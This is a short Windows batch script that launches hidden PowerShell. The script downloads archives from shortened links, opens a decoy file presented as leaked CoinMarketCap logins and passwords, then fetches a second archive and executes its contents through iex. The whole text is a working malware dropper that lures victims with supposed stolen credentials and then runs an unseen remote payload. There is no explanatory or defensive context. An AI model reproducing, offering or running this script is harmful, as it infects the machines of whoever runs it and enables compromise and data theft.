cd %%TEMP%%
powershell -w hidden -Command ^"wget 'bit.ly/3WuTW4p' -OutFile eureka.zip; Expand-Archive eureka.zip; cd eureka; ii CoinMarketCap_Dataleak_logins_and_passwords.txt; del -Fo ..\eureka.zip; wget 'bit.ly/4203S7k' -OutFile pay.zip; Expand-Archive pay.zip; del pay.zip; cd pay; type pay1.txt ^| iex ^"
